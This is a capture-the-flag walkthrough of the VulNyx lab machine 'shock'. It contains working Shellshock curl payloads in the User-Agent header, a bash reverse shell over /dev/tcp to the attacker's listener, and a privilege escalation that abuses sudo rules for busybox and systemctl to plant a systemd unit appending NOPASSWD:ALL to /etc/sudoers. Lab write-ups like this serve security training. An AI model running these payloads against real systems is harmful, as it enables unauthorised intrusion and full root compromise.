# shock

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| shock | m0w | Low | VulNyx |

**Summary:** The shock machine was a time capsule of a classic remote code execution flaw. The service scan showed SSH on port 22 and Apache on port 80, with a filtered FTP port in between, and the box's name was the only hint needed: it echoed the infamous Shellshock vulnerability, CVE-2014-6271, which abuses the way Bash expands environment variables inherited from the `User-Agent` header when a CGI script is executed. A handcrafted request against `/cgi-bin/shell.sh` carrying the marker `() { :; };` followed by a command returned `uid=33(www-data)`, proving command execution on the web server. That primitive was repurposed into a reverse shell delivered through a `bash -i` listener connection, giving an interactive session as `www-data`. The escalation path then became a chain of permissive `sudo` rules. The `www-data` account could run `/usr/bin/busybox` as the `will` user without a password, so BusyBox's built-in `sh` provided a foothold as `will`. The `will` account, in turn, could run `/usr/bin/systemctl` as root without a password. By authoring a malicious systemd unit with `systemctl edit` whose `ExecStart` executed a shell command that appended a `NOPASSWD:ALL` rule for `will` to `/etc/sudoers`, and enabling it with `systemctl enable --now`, the sudoers file was silently rewritten. A final `sudo -i` then produced a root login shell, and both the user and root flags were captured.

---

## Reconnaissance

The engagement began with the standard network sweep and full port scan.

1. The target for the session was located at `192.168.56.109`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 06:39 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00043s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.0041s latency).
MAC Address: 08:00:27:C7:A7:73 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.109 (192.168.56.109)
Host is up (0.0012s latency).
MAC Address: 08:00:27:09:AF:9F (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.96 seconds

┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.109
```

2. A full service scan was run against the target:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 06:41 -0400
Nmap scan report for 192.168.56.109 (192.168.56.109)
Host is up (0.00071s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:60:3e:26:ae:23:3f:e1:8b:5d:18:e7:a7:c7:ce (RSA)
|   256 34:9a:57:60:7d:66:70:d5:b5:ff:47:96:e0:36:23:75 (ECDSA)
|_  256 ae:7d:ee:fe:1d:bc:99:4d:54:45:3d:61:16:f8:6c:87 (ED25519)
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:09:AF:9F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.92 seconds
```

The scan exposed SSH on port 22, a filtered FTP port on 21, and Apache on port 80 serving a page without a title. The machine's name, `shock`, was the decisive clue, since it pointed straight at the Shellshock family of vulnerabilities, CVE-2014-6271 and its relatives, which target Bash through the environment variables handed to CGI scripts.

---

## Initial Access

### Shellshock Remote Code Execution

3. Apache had previously been found to host a CGI script at `/cgi-bin/shell.sh`. Since Shellshock exploits the Bash function parsing performed on environment variables such as `User-Agent`, a crafted header was sent to confirm the vulnerability:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -v -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" http://$ip/cgi-bin/shell.sh
*   Trying 192.168.56.109:80...
* Established connection to 192.168.56.109 (192.168.56.109 port 80) from 192.168.56.104 port 52498 
* using HTTP/1.x
> GET /cgi-bin/shell.sh HTTP/1.1
> Host: 192.168.56.109
> Accept: */*
> User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Wed, 12 Aug 2026 11:35:31 GMT
< Server: Apache/2.4.38 (Debian)
< Transfer-Encoding: chunked
< Content-Type: text/x-sh
< 

uid=33(www-data) gid=33(www-data) groups=33(www-data)
* Connection #0 to host 192.168.56.109:80 left intact
```

The shell `id` output appears directly inside the HTTP response, confirming remote code execution as `www-data`.

### Reverse Shell as www-data

4. A netcat listener was staged on the attacker machine:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nc -lvnp 4444                                              
listening on [any] 4444 ...
```

5. The Shellshock payload was then replaced with a `bash` reverse shell aimed at the listener:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.104/4444 0>&1'" http://$ip/cgi-bin/shell.sh
```

6. The shell connected back, and the session was upgraded to a proper interactive TTY:

```bash
connect to [192.168.56.104] from (UNKNOWN) [192.168.56.109] 59606
bash: cannot set terminal process group (492): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.3$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
bash-4.3$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(kali㉿kali)-[~/nyx]
└─$ stty raw -echo;fg      
[1]  + continued  nc -lvnp 4444

bash-4.3$ export TERM=xterm
bash-4.3$ export SHELL=/bin/bash
bash-4.3$ stty rows 80 cols 150
```

A stable shell existed as `www-data`.

---

## Privilege Escalation

### www-data to will via BusyBox

7. Checking `sudo` privileges for the web user exposed the first lateral move:

```bash
bash-4.3$ sudo -l
Matching Defaults entries for www-data on shock:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on shock:
    (will) NOPASSWD: /usr/bin/busybox
```

The `www-data` account could execute `/usr/bin/busybox` as the user `will` without a password. BusyBox ships an embedded `sh`, which is its own standalone shell.

8. The privilege was used to spawn a shell as `will`:

```bash
bash-4.3$ sudo -u will /usr/bin/busybox sh  


BusyBox v1.30.1 (Debian 1:1.30.1-4) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/usr/lib/cgi-bin $ id
uid=1001(will) gid=1001(will) groups=1001(will)
```

A BusyBox `ash` session ran as `will`.

### will to root via systemctl

9. The `will` account had its own `sudo` entitlement, which was checked next:

```bash
/usr/lib/cgi-bin $ sudo -l
Matching Defaults entries for will on shock:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User will may run the following commands on shock:
    (root) NOPASSWD: /usr/bin/systemctl
```

`will` could run `/usr/bin/systemctl` as root without a password. Systemd unit files can define arbitrary commands to run as root, so a malicious service was the weapon of choice.

10. A new systemd unit was created with `systemctl edit`, which opens an editor for a service file:

```bash
/usr/lib/cgi-bin $ sudo systemctl edit --force --full evil.service
```

11. The service was authored as a one-shot unit whose `ExecStart` appends a full `NOPASSWD:ALL` rule for `will` into the sudoers file:

```bash
[Service]
Type=oneshot
ExecStart=/bin/sh -c 'echo "will ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers'
[Install]
WantedBy=multi-user.target
```

12. The service was enabled and started, which triggered the payload:

```bash
/usr/lib/cgi-bin $ sudo systemctl enable --now evil.service
Created symlink /etc/systemd/system/multi-user.target.wants/evil.service → /etc/systemd/system/evil.service.
/usr/lib/cgi-bin $ sudo -l
Matching Defaults entries for will on shock:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User will may run the following commands on shock:
    (root) NOPASSWD: /usr/bin/systemctl
    (ALL : ALL) NOPASSWD: ALL
```

The sudoers line took effect, and `will` now held unrestricted root privileges.

13. An interactive root shell was invoked:

```bash
/usr/lib/cgi-bin $ sudo -i
root@shock:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
shock
root@shock:~# cat /home/will/user.txt /root/root.txt 
```

With `(ALL) NOPASSWD: ALL` in effect, `sudo -i` dropped straight into a root login shell, and both the user and root flags were read.

---

## Attack Chain Summary

1. **Reconnaissance**: A ping sweep isolated the target at `192.168.56.109`, and a full Nmap scan exposed SSH on port 22, a filtered FTP port, and an Apache web server on port 80. The machine name `shock` pointed directly at the Shellshock vulnerability family.

2. **Vulnerability Discovery**: A CGI script at `/cgi-bin/shell.sh` was found on the web server. Sending the Shellshock function marker `() { :; };` inside the `User-Agent` header and following it with a command proved remote code execution.

3. **Exploitation**: The Shellshock primitive was converted into a reverse shell using a `bash -i` over `/dev/tcp` payload, producing a stabilized interactive session as `www-data`.

4. **Internal Enumeration**: A `sudo` policy allowed `www-data` to run `/usr/bin/busybox` as `will`, granting a shell as that user. A second `sudo` policy allowed `will` to run `/usr/bin/systemctl` as root without a password.

5. **Privilege Escalation**: A malicious systemd unit was created with `systemctl edit` and started with `systemctl enable --now`, executing a command that appended a `NOPASSWD:ALL` sudoers entry for `will`. A subsequent `sudo -i` granted a root shell and complete compromise.